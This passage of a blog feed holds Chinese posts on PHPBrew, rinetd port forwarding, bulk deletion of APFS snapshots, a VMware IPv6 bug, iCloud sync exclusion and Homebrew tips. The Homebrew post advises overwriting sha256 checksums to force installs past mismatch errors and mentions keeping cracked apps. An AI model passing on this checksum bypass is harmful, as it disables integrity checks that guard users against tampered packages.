5.6.39, 5.6.38, 5.6.37, 5.6.36, 5.6.35, 5.6.34, 5.6.33 ...5.5: 5.5.38, 5.5.37, 5.5.36, 5.5.35, 5.5.34, 5.5.33, 5.5.32, 5.5.31 ...5.4: 5.4.45, 5.4.44, 5.4.43, 5.4.42, 5.4.41, 5.4.40, 5.4.39, 5.4.38 ...5.3: 5.3.29, 5.3.28, 5.3.27, 5.3.26, 5.3.25, 5.3.24, 5.3.23, 5.3.22 ...5.2: 5.2.17, 5.2.16, 5.2.15, 5.2.14, 5.2.13, 5.2.12, 5.2.11, 5.2.10 ...5.1: 5.1.6, 5.1.5, 5.1.4, 5.1.3, 5.1.2, 5.1.1, 5.1.0 ...5.0: 5.0.5, 5.0.4, 5.0.3, 5.0.2, 5.0.1, 5.0.0 ...PHPBrew needs PHP 5.3 or above to run. build&#x2F;switch to versions below 5.3 at your own risk. 开始构建你自己的PHP用默认variant简单构建并安装PHP： 1$ phpbrew install 7.4.13 +default 这里我们推荐使用 default 设置，它涵盖了大部分广泛使用的variant；如果你需要一个 最小化 安装，那就移除 default，替换成别的variant（经笔者摸索，最小化 为 +opcache -xml）。 通过传递参数 -j 或者 –jobs 进行并行编译： 1$ phpbrew install -j $(nproc) 7.4.13 +default 包含测试： 1$ phpbrew install --test 7.4.13 +default 包含调试信息： 1$ phpbrew -d install --test 7.4.13 +default 安装小于5.3的老版本（笔者实测5.0版本的链接均已不可访问） 1$ phpbrew install --old 5.2.17 安装 next 不稳定版： 1$ phpbrew install next 从GitHub仓库的某tag安装 1$ phpbrew install github:php&#x2F;php-src@PHP-7.0 用 as 给构建安装的PHP取别名，以笔者在前面描述的 最小化 安装举例 1$ phpbrew install 7.4.13 +opcache -xml as 7.4.13-minimal 清理构建目录123$ phpbrew clean 7.4.13-minimal&#x3D;&#x3D;&#x3D;&gt; Running make clean: &#x2F;usr&#x2F;bin&#x2F;make -C &#39;&#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;build&#x2F;7.4.13-minimal&#39; --quiet &#39;clean&#39;Distribution is cleaned up. Woof! VariantsPHPBrew 帮你安排构建参数，你可以简单地指定variant，PHPBrew会自动检测 include 路径并且构建编译选项。 PHPBrew 提供了默认的和虚拟的variant。默认的包含了大部分广泛使用的variants；虚拟的则定义了一组variant，即使用一个虚拟variant可以同时选用多个variant。 查看PHPBrew提供了哪些variant： 1234567891011121314151617181920212223242526272829303132333435$ phpbrew variantsVariants: all, apxs2, bcmath, bz2, calendar, cgi, cli, ctype, curl, dba, debug, dom, dtrace, editline, embed, exif, fileinfo, filter, fpm, ftp, gcov, gd, gettext, gmp, hash, iconv, imap, inifile, inline, intl, ipc, ipv6, json, kerberos, ldap, libgcc, mbregex, mbstring, mcrypt, mhash, mysql, opcache, openssl, pcntl, pcre, pdo, pear, pgsql, phar, phpdbg, posix, readline, session, soap, sockets, sodium, sqlite, static, tidy, tokenizer, wddx, xml, xmlrpc, zip, zlib, ztsVirtual variants: dbs: sqlite, mysql, pgsql, pdo mb: mbstring, mbregex neutral: small: bz2, cli, dom, filter, ipc, json, mbregex, mbstring, pcre, phar, posix, readline, xml, curl, openssl default: bcmath, bz2, calendar, cli, ctype, dom, fileinfo, filter, ipc, json, mbregex, mbstring, mhash, pcntl, pcre, pdo, pear, phar, posix, readline, sockets, tokenizer, xml, curl, openssl, zip everything: dba, ipv6, dom, calendar, wddx, static, inifile, inline, cli, ftp, filter, gcov, zts, json, hash, exif, mbstring, mbregex, libgcc, pdo, posix, embed, sockets, debug, phpdbg, zip, bcmath, fileinfo, ctype, cgi, soap, pcntl, phar, session, tokenizer, opcache, imap, ldap, tidy, kerberos, xmlrpc, fpm, dtrace, pcre, mhash, mcrypt, zlib, curl, readline, editline, gd, intl, sodium, openssl, mysql, sqlite, pgsql, xml, gettext, iconv, bz2, ipc, gmp, pearUsing variants to build PHP: phpbrew install php-5.3.10 +default phpbrew install php-5.3.10 +mysql +pdo phpbrew install php-5.3.10 +mysql +pdo +apxs2 phpbrew install php-5.3.10 +mysql +pdo +apxs2&#x3D;&#x2F;usr&#x2F;bin&#x2F;apxs2 可以看到虚拟variant有：dbs, mb, neutral, small, default, everything （表明上来看 neutral 是最精简的，它不添加任何编译选项，但实际安装过程中还是会启用 xml 和 opcache，而这二者中只有后者无任何第三方依赖。所以真正意义上的 最小化 为 +opcache -xml 或者 +neutral -xml） 需要启用一个variant，直接在variant前加一个 + 号 需要禁用一个variant，直接在variant前加一个 - 号 + 和 - 号可以多个随意组合 指定依赖路径，比如构建pgsql扩展时 1$ phpbrew install 7.4.13 +pdo +pgsql&#x3D;&#x2F;opt&#x2F;local&#x2F;lib&#x2F;postgresql91&#x2F;bin 在 /opt/local/lib/postgresql91/bin 路径下的 pg_config 是构建时需要的 传递额外的configure选项12$ phpbrew install 7.4.13 +mysql +sqlite -- \\ --enable-ftp --apxs2&#x3D;&#x2F;opt&#x2F;local&#x2F;apache2&#x2F;bin&#x2F;apxs 使用与切换使用（临时切换版本） 12$ phpbrew use 7.4.13$ phpbrew use 7.4.13-minimal 切换默认版本 1$ phpbrew switch 7.4.13-minimal 从PHPBrew的版本切换到系统安装的版本 1$ phpbrew off 列举安装的所有php版本1$ phpbrew list 扩展安装器PHPBrew 还能方便的帮助你安装 PHP扩展（无论是PHP源码内自带的亦或是来自于 PECL 的） 如果是PHP源码内自带的，PHPBrew会自动切换到源码目录进而安装扩展；否则会去 PECL http://pecl.php.net去获取扩展源码包 PHPBrew同时会为安装上的扩展创建配置，省去你手写启用扩展的配置文件。配置文件夹位于: $HOME/.phpbrew/php/&#123;php-version&#125;/var/db 安装扩展 - 最简单的方式在你安装任何扩展之前，你应该切换到需要安装扩展的php版本： 1$ phpbrew use 7.4.13-minimal 然后运行 ext install 来安装自己需要的扩展 1234$ phpbrew ext install redis$ phpbrew ext install xdebug$ phpbrew ext install acpu$ phpbrew ext install memcache 安装扩展 - 指定稳定性版本 指定 稳定性标签，可选项有 stable / latest / beta，不指定即默认为 stable，例如：$ phpbrew ext install xdebug latest 指定 扩展版本号，例如：$ phpbrew ext install xdebug 3.0.0 查看扩展的配置选项要查看构建扩展是否有额外的配置选项，使用 ext show 12345678910111213141516$ phpbrew ext show redis Name: redis Source Directory: &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;build&#x2F;7.4.13&#x2F;ext&#x2F;redis Config: &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;build&#x2F;7.4.13&#x2F;ext&#x2F;redis&#x2F;config.m4 INI File: &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13&#x2F;var&#x2F;db&#x2F;redis.ini Extension: Pecl Zend: no Loaded: yes Configure Options: --enable-redis-igbinary[&#x3D;no] enable igbinary serializer support? --enable-redis-lzf[&#x3D;no] enable lzf compression support? --enable-redis-zstd[&#x3D;no] enable zstd compression support? 为构建扩展添加额外配置选项1$ phpbrew ext install redis -- --enable-redis-lzf&#x3D;yes 从Github安装扩展特殊的前缀 github: 则告诉PHPBrew要去 php-memcached-dev/phpmemcached 的 php7 分支拉取代码进行构建 1$ phpbrew ext install github:php-memcached-dev&#x2F;php-memcached php7 -- --disable-memcached-sasl 指定下载器进行安装扩展目前，PHPBrew有4个下载器实现： php_curl 内置的 php curl扩展，为默认下载器 php_stream 内置的 php steam封装 curl wget 指定 curl 作为下载器： 1$ phpbrew ext install --downloader curl redis 如果选用的下载器支持 User-Agent 和 Proxy 配置： 1$ phpbrew ext install --downloader php_curl --http-proxy&#x3D;... --http-proxy-auth&#x3D;... apcu 启用扩展笔者亲测，通过 ext install 安装的扩展，安装完即为启用状态。 另外也可以通过 PECL 安装扩展并且手动启用： 12$ pecl install mongo$ phpbrew ext enable mongo ext enable 指令帮你创建配置文件 {current php base}/var/db/{extension name}.ini 用以启用扩展 为当前php版本配置 php.ini12$ export EDITOR&#x3D;vim # 该行为可选项，指定你常用的编辑器$ phpbrew config 更新 PHPBrew运行 self-update 指令将会从Github的master分支下载最新版本的二进制文件替换自身（即本文开头的存放位置/usr/local/bin/phpbrew） 相关的目录已安装的php位于 $HOME/.phpbrew/php，以 7.4.13-minimal 举例，为 $HOME/.phpbrew/php/7.4.13-minimal/bin/php 配置文件为 $HOME/.phpbrew/php/7.4.13-minimal/etc/php.ini 扩展的配置文件位于 $HOME/.phpbrew/php/7.4.13-minimal/var/db目录下： 123$HOME&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13-minimal&#x2F;var&#x2F;db&#x2F;memcache.ini$HOME&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13-minimal&#x2F;var&#x2F;db&#x2F;xdebug.ini$HOME&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13-minimal&#x2F;var&#x2F;db&#x2F;redis.ini 在各目录之间切换的快捷命令官方文档里这部分涉及的指令，比如 build-dir / dist-dir / etc-dir / var-dir 已亲测全部阵亡 PHP fpmPHPBrew同时也为 php-fpm 提供了管理指令（前提是在构建的时候得加上 +fpm variant） 启动/停止/重启 php-fpm： 123$ phpbrew fpm start$ phpbrew fpm stop $ phpbrew fpm restart 显示 php-fpm 模块： 1234567891011$ phpbrew fpm module[PHP Modules]bz2cgi-fcgiCorectypecurl...[Zend Modules]Xdebug 测试 php-fpm 配置是否正确： 12$ phpbrew fpm test[01-Dec-2020 18:28:04] NOTICE: configuration file &#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13&#x2F;etc&#x2F;php-fpm.conf test is successful 编辑 php-fpm 配置： 12$ export EDITOR&#x3D;vim # 该行为可选项，指定你常用的编辑器$ phpbrew fpm config 已安装的 php-fpm 位于 $HOME/.phpbrew/php/&#123;php-version&#125;/sbin 下 相应的 php-fpm.conf 位于 $HOME/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf.default, 你可以将默认配置文件拷贝到需要的位置进行使用，比如 $ cp -v ~/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf.default ~/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf $ php-fpm --php-ini ~/.phpbrew/php/&#123;php-version&#125;/etc/php.ini --fpm-config ~/.phpbrew/php/&#123;php-version&#125;/etc/php-fpm.conf 安装扩展应用通过 app get 指令来安装例如 composer 和 phpunit 这样的 app，笔者亲测该指令也已阵亡 结尾以上便是笔者结合 PHPBrew 官方文档给大家梳理的使用指南，写该文时每条指令笔者都亲自测试过，所以发现了官方文档里有很多地方都 已过时 或 已更新。对于前者，笔者用横线给划掉了；对于后者，笔者直接进行了修正。 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"dev","slug":"dev","permalink":"https://blog.chaosjohn.com/tags/dev/"},{"name":"package manager","slug":"package-manager","permalink":"https://blog.chaosjohn.com/tags/package-manager/"}]},{"title":"端口转发(篇一) - rinetd","slug":"Port-Forwarding-1","date":"2020-11-30T09:09:13.000Z","updated":"2020-12-05T02:23:29.999Z","comments":true,"path":"Port-Forwarding-1.html","link":"","permalink":"https://blog.chaosjohn.com/Port-Forwarding-1.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言笔者准备写一个 端口转发 系列文章，涉及计多个工具和命令。 本文为篇一，介绍一个大家常用的工具，rinetd。 简介A: 端口转发英文：Port forwarding 将一台 主机A 的 端口x 转发到另一台 主机B 的 端口y 并由 主机B 提供转发的网络服务。 即通过访问 主机B:端口y 来访问部署在 主机A:端口x 上的服务。 简介B: rinetd项目主页 / Github rinetd是为在一个Unix和Linux操作系统中为重定向传输控制协议(TCP)连接的一个工具。 rinetd是单一过程的服务器，它处理任何数量的连接到在配置文件etc/rinetd中指定的地址/端口对。 尽管rinetd使用非闭锁I/O运行作为一个单一过程，它可能重定向很多连接而不对这台机器增加额外的负担。 场景最早接触到这个工具，是几年前购买了阿里云的Redis实例，当初该服务未推出公网连接地址，只能通过内网访问，即只在同一个区域的VPC内可达，在当初的业务环境下，只能从阿里云的ECS访问Redis实例。 这就很恼怒了，在笔者本地的开发环境，也要连接改Redis实例，咋办哩。 于是就在阿里云在线文档里找到了这个工具，我还依稀记得那篇文档里，介绍的是如何在CentOS下载rinetd源码（还提供了tar.gz的链接地址），然后编译安装它。（不过伴随着阿里云Redis实例开始支持公网连接后，该文档已经消失在了历史长河里了。） 安装 编译安装（适用于任何Linux环境，但个人不推荐，因为还得手动配置开机自启） 123456$ curl -LO &#39;http:&#x2F;&#x2F;www.rinetd.com&#x2F;download&#x2F;rinetd.tar.gz&#39;$ tar xvzf rinetd.tar.gz$ cd rinetd$ sed -i &#39;s&#x2F;65536&#x2F;65535&#x2F;g&#39; rinetd.c （修改端口范围，否则会报错）$ make$ sudo make install （提示：官方下载的源码包无法在macOS下完成编译，报错 error: implicit declaration of function &#39;inet_addr&#39; is invalid in C99） 在 macOS 上借助 Homebrew 安装 1$ brew install rinetd 在 Debian / Ubuntu 上借助 apt 安装 12$ sudo apt update$ sudo apt install rinetd 在 RHEL / CentOS 上借助 yum 安装 官方源中无rinetd，所以需要先安装三方源 12345678$ sudo vim &#x2F;etc&#x2F;yum.repos.d&#x2F;nux-misc.repo[nux-misc]name&#x3D;Nux Miscbaseurl&#x3D;http:&#x2F;&#x2F;li.nux.ro&#x2F;download&#x2F;nux&#x2F;misc&#x2F;el6&#x2F;x86_64&#x2F;enabled&#x3D;0gpgcheck&#x3D;1gpgkey&#x3D;http:&#x2F;&#x2F;li.nux.ro&#x2F;download&#x2F;nux&#x2F;RPM-GPG-KEY-nux.ro 然后再安装rinetd 1$ sudo yum --enablerepo&#x3D;nux-misc install rinetd 配置配置文件路径为 /etc/rinetd.conf，并附上那台转发Redis的配置内容 1234567891011121314151617181920212223242526## this is the configuration file for rinetd, the internet redirection server## you may specify global allow and deny rules here# only ip addresses are matched, hostnames cannot be specified here# the wildcards you may use are * and ?## allow 192.168.2.*# deny 192.168.2.1?## forwarding rules come here## you may specify allow and deny rules after a specific forwarding rule# to apply to only that forwarding rule## bindadress bindport connectaddress connectport0.0.0.0 6379 r-ly25ac35fxxxxx.redis.rds.aliyuncs.com 6379# logging informationlogfile &#x2F;var&#x2F;log&#x2F;rinetd.log# uncomment the following line if you want web-server style logfile format# logcommon allow 和 deny 是配置 允许和阻止 的 IP地址/IP段 转发规则一行一个，可配置多行 bindadress bindport connectaddress connectport，如示例里配置为：监听本网卡地址的6379端口号，并且转发到VPC内网Redis实例的6379端口号。 运行和自启 如果是通过源码编译安装的，命令行直接执行 rinetd；自启的话，得手动编写 Systemd 的Unit文件来管理或者通过 Supervisor 来管理。 如果是 apt 或 yum 安装的，并且init程序是 Systemd 启动服务: $ sudo systemctl start rinetd 停止服务: $ sudo systemctl stop rinetd 重启服务: $ sudo systemctl restart rinetd 开机自启: $ sudo systemctl enable rinetd 禁用自启: $ sudo systemctl disable rinetd 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"tool","slug":"tool","permalink":"https://blog.chaosjohn.com/tags/tool/"},{"name":"port-forwarding","slug":"port-forwarding","permalink":"https://blog.chaosjohn.com/tags/port-forwarding/"}]},{"title":"清理 APFS 快照的shell脚本","slug":"Clean-APFS-Snapshots","date":"2020-11-29T15:26:03.000Z","updated":"2020-12-05T02:23:29.924Z","comments":true,"path":"Clean-APFS-Snapshots.html","link":"","permalink":"https://blog.chaosjohn.com/Clean-APFS-Snapshots.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 背景macOS 从 10.13 High Sierra开始，引入了 APFS(Apple File System) 替代原先的 HFS+ 作为默认磁盘格式。 笔者觉得最大的特色在于 写时拷贝(Copy-on-Write) 和 快照(Snapshots)。对于前者，以后有机会笔者再写文阐述，本文主要针对后者。 快照的引入，可以方便并且快速地恢复到过去的某个时间节点，它与 时间机器(Time Machine) 配合起来，可以极大程度的保证数据安全。 但快照也导致一个不良后果，即占据了大量的磁盘空间。比如明明没使用很多文件，怎么磁盘空间耗去大半。 查看快照这里利用到 tmutil 这个命令，通过查询 man 手册，发现它全称为 Time Machine utility，即原用于时间机器。 $ tmutil listlocalsnapshots / 123456789101112131415161718192021222324Snapshots for volume group containing disk &#x2F;:com.apple.TimeMachine.2020-11-29-004329.localcom.apple.TimeMachine.2020-11-29-014637.localcom.apple.TimeMachine.2020-11-29-024241.localcom.apple.TimeMachine.2020-11-29-034330.localcom.apple.TimeMachine.2020-11-29-044145.localcom.apple.TimeMachine.2020-11-29-054542.localcom.apple.TimeMachine.2020-11-29-064456.localcom.apple.TimeMachine.2020-11-29-074846.localcom.apple.TimeMachine.2020-11-29-084356.localcom.apple.TimeMachine.2020-11-29-094633.localcom.apple.TimeMachine.2020-11-29-104339.localcom.apple.TimeMachine.2020-11-29-114752.localcom.apple.TimeMachine.2020-11-29-134250.localcom.apple.TimeMachine.2020-11-29-144214.localcom.apple.TimeMachine.2020-11-29-154417.localcom.apple.TimeMachine.2020-11-29-164352.localcom.apple.TimeMachine.2020-11-29-174500.localcom.apple.TimeMachine.2020-11-29-184606.localcom.apple.TimeMachine.2020-11-29-194225.localcom.apple.TimeMachine.2020-11-29-204725.localcom.apple.TimeMachine.2020-11-29-214338.localcom.apple.TimeMachine.2020-11-29-224417.localcom.apple.TimeMachine.2020-11-29-234647.local 通过 df -th 查看磁盘剩余 153GB 清理快照这里祭出一行shell脚本 $ for snapshot in $(tmutil listlocalsnapshots / | awk -F. ‘{print $4}’); do tmutil deletelocalsnapshots $snapshot; done 1234567891011121314151617181920212223Deleted local snapshot &#39;2020-11-29-004329&#39;Deleted local snapshot &#39;2020-11-29-014637&#39;Deleted local snapshot &#39;2020-11-29-024241&#39;Deleted local snapshot &#39;2020-11-29-034330&#39;Deleted local snapshot &#39;2020-11-29-044145&#39;Deleted local snapshot &#39;2020-11-29-054542&#39;Deleted local snapshot &#39;2020-11-29-064456&#39;Deleted local snapshot &#39;2020-11-29-074846&#39;Deleted local snapshot &#39;2020-11-29-084356&#39;Deleted local snapshot &#39;2020-11-29-094633&#39;Deleted local snapshot &#39;2020-11-29-104339&#39;Deleted local snapshot &#39;2020-11-29-114752&#39;Deleted local snapshot &#39;2020-11-29-134250&#39;Deleted local snapshot &#39;2020-11-29-144214&#39;Deleted local snapshot &#39;2020-11-29-154417&#39;Deleted local snapshot &#39;2020-11-29-164352&#39;Deleted local snapshot &#39;2020-11-29-174500&#39;Deleted local snapshot &#39;2020-11-29-184606&#39;Deleted local snapshot &#39;2020-11-29-194225&#39;Deleted local snapshot &#39;2020-11-29-204725&#39;Deleted local snapshot &#39;2020-11-29-214338&#39;Deleted local snapshot &#39;2020-11-29-224417&#39;Deleted local snapshot &#39;2020-11-29-234647&#39; 再次通过 df -th 查看磁盘剩余 159GB，释放出 6GB 空间 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"APFS","slug":"APFS","permalink":"https://blog.chaosjohn.com/tags/APFS/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"}]},{"title":"IPv6在虚拟机通过无线网卡桥接的网络下无法使用(VMware WorkStation)","slug":"IPv6-not-working-from-bridged-wireless","date":"2020-11-28T10:19:22.000Z","updated":"2020-12-05T02:23:29.983Z","comments":true,"path":"IPv6-not-working-from-bridged-wireless.html","link":"","permalink":"https://blog.chaosjohn.com/IPv6-not-working-from-bridged-wireless.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 背景今年年中的时候，在油管上看到 悟空大大 关于 Minisforum GK41 的视频，心里痒痒，于是也入手了一个。主要具体参数为： CPU: Intel® Celeron® Processor J4125 内存: LPDDR4 8GB (On Board) 网络: 双千兆螃蟹卡 + 802.11ac双频Wifi 买之前想的很美妙，买它！当软路由！就奔着它双网口且不到日常使用5~6W的超低功耗！ 结果买回来就开始纠结了，用它当软路由是不是太浪费了？毕竟128GB的M.2固态，只拿来跑OpenWRT，很难把空间占满啊；内部也没有SATA接口，无法把废弃硬盘利用起来；也不支持从TF卡槽启动，手里一堆TF卡也无用。 机子买来就预装了正版Windows10，想着好久没有用Windows了，那就顺便玩玩吧。于是手就不听使唤的把 VMware WorkStation给安装上了，又不听使唤的装了个 Manjaro Linux 虚拟机。 问题：客户机IPv6无法使用网络拓扑结构： GK41主机通过无线网卡连接Wi-Fi 虚拟客户机采用桥接模式（非NAT模式），桥接无线网卡加入网络 至此，虚拟客户机也从上级路由器获得IPv4地址，与GK41主机处于同一个局域网。 但是无法访问IPv6网络（由于这台GK41已经转手卖掉了很久，所以记不清是无法从上级路由器获取IPv6地址还是分配到了IPv6地址但无法联通网络）。因笔者将GK41放在公司，脱离了IPv6就意味着笔者无法便捷地从家里访问到这台虚拟客户机。 解决过程（最后发现无解）尝试：插上网线，把桥接模式从无线网卡改为有线网卡，IPv6奇迹般的有了！所以问题肯定出在了 无线桥接 上。 于是笔者各种查资料爬帖，各种折腾，最后发现了2008年的一篇帖子IPv6+Bridged+Wireless。 文中描述 This is a known issue, IPv6 is not expected to work over a wireless bridge. 在帖子发布的时候，这个bug（编号#26078）覆盖了VMware的全线产品，包括WorkStation/Player/Fusion。另参考 （实测 VMware Fusion 在很早以前就已经修复该bug，因为笔者有一台2009年的MacBook，还跑着 Mac OS X 10.7 Lion，运行着 VMware Fusion 6.0.6版本，而其内的虚拟客户机的IPv6是正常的，包括后来的高版本Fusion下的虚机IPv6都好使。所以很明显，只是WorkStation上这个bug依旧存在） 至此，放弃折腾，Over。(如何有网友发现解决该问题的办法，不吝赐教哈，评论区或者加我微信 Chaos_John )","categories":[],"tags":[{"name":"Virtualization","slug":"Virtualization","permalink":"https://blog.chaosjohn.com/tags/Virtualization/"},{"name":"IPv6","slug":"IPv6","permalink":"https://blog.chaosjohn.com/tags/IPv6/"},{"name":"network","slug":"network","permalink":"https://blog.chaosjohn.com/tags/network/"},{"name":"VMware","slug":"VMware","permalink":"https://blog.chaosjohn.com/tags/VMware/"}]},{"title":"iCloud同步排除文件/目录","slug":"iCloud-Sync-Exclusion","date":"2020-11-27T06:49:16.000Z","updated":"2020-12-05T02:23:30.016Z","comments":true,"path":"iCloud-Sync-Exclusion.html","link":"","permalink":"https://blog.chaosjohn.com/iCloud-Sync-Exclusion.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言苹果的iCloud服务，是笔者离不开苹果生态的一大重要原因。 但是苹果鸡贼的很，免费用户5GB存储空间轻轻松松就存满了，所以早年刚出付费升级容量的时候，我就购买了最低的付费容量，20GB/¥6/月。虽然不多，但是备份iPhone设备（特别是相册），也是够用的。不过后来苹果良心发现，加量不加价，自动给变更成了50GB。 自从 OS X 10.10 Yosemite 开始，iCloud开始可以用于在mac上进行文件存储，又自从 iOS 11 开始，iCloud Drive被集成到了iPhone/iPad上，任意设备都可访问和编辑存储在iCloud内的文件，至此，文件跨设备共享和同步，就成了苹果生态的一大杀手锏。iCloud发展历史 请移步 维基百科 以至于当50GB也不够用的时候，我毫不纠结的升级到了 200GB/¥20/月 的套餐（还支持家庭组共享容量）。 iCloud 储存空间方案和定价 痛点问题为了方便在多台mac设备之间切换却又保持工作的连贯，iCloud Drive还被很多人用作同步工程目录。 举个例子，当前端工程放在iCloud内，光一个 node_modules 目录，就能占据你几百MB甚至上GB的空间，何其浪费。 解决办法将类似 node_modules 的目录排除在外。一般来说，具备同步功能的工具（比如Syncthing）都会有 排除目录/文件 的设置项，但是iCloud偏偏没有。社区内很多用户向苹果提了改进意见，但是苹果官方就是“不听不听，王八念经”的态度。 但也不能说苹果没有提供排除文件/目录的方案，只不过方案比较恶心罢了。很简单，在目录/文件夹尾部加上 .nosync 后缀，就不会被iCloud同步了。 喵喵喵？？？需要我改文件名？？？这叫什么事啊摔！！！ 没辙，这个时候只能用“软链接”来实现了： mv node_modules node_module.nosync 重命名尾部加 .nosync ln -sf node_modules.nosync node_modules，将重命名后的目录软链接到 node_modules，这样 npm 还能通过 node_modules 目录管理第三方库 当然，也有开源工具来帮你更高效地做这件事，移步HaoChuan9421/nosync-icloud 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"iCloud","slug":"iCloud","permalink":"https://blog.chaosjohn.com/tags/iCloud/"}]},{"title":"Homebrew更新相关小技巧","slug":"Homebrew-upgrade","date":"2020-11-26T07:22:22.000Z","updated":"2020-12-05T02:23:29.980Z","comments":true,"path":"Homebrew-upgrade.html","link":"","permalink":"https://blog.chaosjohn.com/Homebrew-upgrade.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言笔者在四年前曾写过一文HomeBrew – OSX下的最强软件包管理器，篇中详细介绍了HomeBrew以及Cask的使用。 多年过去了，Homebrew依旧非常流行，但内在也发生了很多变化，比如Cask原先作为第三方Tap的存在，现已整合到Homebrew内，在未安装Cask的环境里，执行 brew cask install $&#123;app&#125;，Homebrew则会自动安装Cask。 同时，在Homebrew的日常使用中，笔者也遇到了很多问题，本文就着重于“踩坑”和“填坑”。 “这些年遇到的坑”Homebrew自动更新brew 提供了 update 命令，但是你执行 install 或 upgrade 时，都会强制性先 update，浪费宝贵的时间。 解决： brew命令前加上变量HOMEBREW_NO_AUTO_UPDATE=1，变为 $ HOMEBREW_NO_AUTO_UPDATE=1 brew install … 或使用alias别名，在.bashrc或.zshrc中新增一行 alias brew=&quot;HOMEBREW_NO_AUTO_UPDATE=1 brew&quot; 或导出环境变量，在.bashrc或.zshrc中新增一行 export HOMEBREW_NO_AUTO_UPDATE=1，笔者推荐这种方法 或者使用 Homebrew/aliases，执行 brew alias install_no_autoupdate=&#39;!HOMEBREW_NO_AUTO_UPDATE=1 brew install&#39;（install_no_autoupdate 名字任意更换），以后要执行无预更新的 brew install $&#123;formula&#125; 操作，都改为 brew install_no_autoupdate $&#123;formula&#125; Cask 安装的应用，和 App Store 安装的应用，都混在了一起因为双方都把应用安装到了 /Applications 目录下，所以导致 分不清应用到底是Cask安装的，还是App Store里安装的 如果Cask和App Store安装同一款应用，则后安装或更新的应用，就会覆盖掉先前存在的版本 解决：export HOMEBREW_CASK_OPTS=&quot;--appdir=~/Applications/_&quot;，这样Cask会自动将应用都安装到用户目录下的 Applications/_/ 里。 这里我想介绍一下我在mac下的应用管理，仅供参考： App Store安装的应用，都位于 /Applications/ 下 Cask安装的应用，都位于 ~/Applications/_/ 下 网络上搜罗来的破解应用，都位于 ~/Applications/#/ 下 JetBrains公司的IDE，都用 JetBrains Toolbox 进行安装管理（当然Toolbox本身是用Cask进行安装的） 其他开源/免费的应用，都位于 ~/Applications/ 下 Cask 批量更新应用在前文HomeBrew – OSX下的最强软件包管理器中笔者曾给出过一行shell脚本用来批量更新Cask的应用，但是这么多年过去了，这行脚本笔者不再推荐使用。解决：brew tap buo/cask-upgrade，项目链接，安装完之后， 执行: brew cu，更新所有“存在更新版本”的应用 执行: brew cu $&#123;app&#125;，更新特定app 选项: -a, --all，包含标记了 auto-update 的应用；-f, --force，包含当前版本号为 latest 的应用；-y, --yes，对所有询问是否确认更新，自动应答 yes 因国内网络环境导致brew速度慢这里的慢包含两方面：brew update 慢 &amp; brew install 慢 解决方案A: 换源策略 brew update 慢，参考清华镜像源指南 brew install 慢，参考清华镜像源指南 解决方案B: 代理策略, export all_proxy=socks5://$&#123;host&#125;:$&#123;port&#125;，替换自己代理主机地址和端口即可 Error: SHA256 mismatch / Error: Checksum mismatch前者是 brew 后者是 cask，错误原因，仓库里记载的校验值和实际下载下载的文件校验值不一致 解决: 执行 rm -rf ~/Library/Caches/Homebrew 将本地缓存目录删除后重试，有概率能解决问题，适用于软件发行者修改应用后缺没有更改版本号就发行出去的情况。若未解决，针对于 brew，编辑 /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core/Formula/$&#123;formula&#125;.rb，针对于 cask，编辑 /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask/Casks/$&#123;app&#125;.rb，将 sha256修改为实际校验值，保存，再次执行先前操作，大概率能成功。切记两点主意事项： 需禁用brew的自动更新，否则前脚刚改完校验值，后脚自动更新就把校验值改回来了 更改校验值后不要关闭编辑器，等安装/更新应用成功后，立即撤销更改，再关闭编辑器，因为brew和cask的仓库是用git管理的，更改仓库文件对后续的更新会造成冲突。如果发生冲突了，也别担心，到仓库根目录执行 git reset --hard恢复原样。brew 的仓库目录位于 /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core/；cask 的仓库目录位于 /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask/ 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"OS X & 